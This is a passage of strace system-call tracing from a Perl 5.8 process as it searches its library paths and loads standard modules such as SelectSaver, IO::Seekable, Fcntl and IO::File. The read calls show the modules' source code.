@_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
12207 20:24:32.560302 read(8, "", 4096) = 0
12207 20:24:32.560319 close(8)          = 0
12207 20:24:32.560382 stat64("/etc/perl/SelectSaver.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560399 stat64("/etc/perl/SelectSaver.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560413 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560425 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560444 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560457 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560471 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560483 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560496 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560508 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560522 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560534 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560548 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.560561 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
12207 20:24:32.560582 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.560597 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.560608 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.560627 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
12207 20:24:32.560824 brk(0x81d6000)    = 0x81d6000
12207 20:24:32.560855 read(8, "", 4096) = 0
12207 20:24:32.560866 close(8)          = 0
12207 20:24:32.561326 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
12207 20:24:32.561991 read(6, "", 4096) = 0
12207 20:24:32.562008 close(6)          = 0
12207 20:24:32.562047 stat64("/etc/perl/IO/Seekable.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.562063 stat64("/etc/perl/IO/Seekable.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.562077 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.562090 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.562104 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.562117 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.562131 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.562143 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.562294 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.578786 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.578821 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.578835 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
12207 20:24:32.578858 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:32.578874 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.578886 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:32.578908 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
12207 20:24:32.579054 stat64("/etc/perl/Fcntl.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579070 stat64("/etc/perl/Fcntl.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579083 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579095 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579109 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579121 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579135 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579147 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579160 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579172 stat64("/usr/share/perl5/Fcntl.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579225 stat64("/usr/lib/perl/5.8/Fcntl.pmc",  <unfinished ...>
12205 20:24:32.579244 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
12207 20:24:32.579270 <... stat64 resumed> 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.579277 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
12207 20:24:32.579297 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
12205 20:24:32.579310 <... rt_sigprocmask resumed> NULL, 8) = 0
12207 20:24:32.579317 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
12205 20:24:32.579334 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12207 20:24:32.579342 <... ioctl resumed> , 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.579350 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.579369 read(8,  <unfinished ...>
12205 20:24:32.579376 <... rt_sigprocmask resumed> [], 8) = 0
12205 20:24:32.579385 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
12207 20:24:32.579393 <... read resumed> "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
12205 20:24:32.579656 <... rt_sigprocmask resumed> NULL, 8) = 0
12205 20:24:32.579663 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12207 20:24:32.579896 brk(0x81f7000 <unfinished ...>
12205 20:24:32.579906 <... rt_sigprocmask resumed> [], 8) = 0
12205 20:24:32.579932 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12205 20:24:32.579946 waitpid(-1,  <unfinished ...>
12207 20:24:32.618768 <... brk resumed> ) = 0x81f7000
12207 20:24:32.649000 read(8, "", 4096) = 0
12207 20:24:32.649029 close(8)          = 0
12207 20:24:32.649112 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12207 20:24:32.649139 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12207 20:24:32.649170 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
12207 20:24:32.649186 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
12207 20:24:32.649332 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12207 20:24:32.649359 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d19000
12207 20:24:32.649375 mmap2(0xb7d1c000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d1c000
12207 20:24:32.649392 close(8)          = 0
12207 20:24:32.649618 read(6, "", 4096) = 0
12207 20:24:32.649633 close(6)          = 0
12207 20:24:32.649668 stat64("/etc/perl/IO/File.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.649684 stat64("/etc/perl/IO/File.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.649712 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.649725 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.649740 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.649753 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.649768 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.649780 stat64("/usr/lib/perl5/IO/File.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.649793 stat64("/usr/share/perl5/IO/File.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.649807 stat64("/usr/share/perl5/IO/File.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:32.649820 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:32.649833 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
12207 20:24:32.649856 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:32.649872 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.649885 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:32.649904 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
12207 20:24:32.650151 stat64("/etc/perl/File/Spec.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650168 stat64("/etc/perl/File/Spec.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650195 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650239 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650254 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650285 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650299 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650311 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650324 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650337 stat64("/usr/share/perl5/File/Spec.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650351 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650364 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650378 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.650391 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
12207 20:24:32.650413 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.650428 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.650439 _llseek(8, 0, [0], SEEK_CUR) = 0
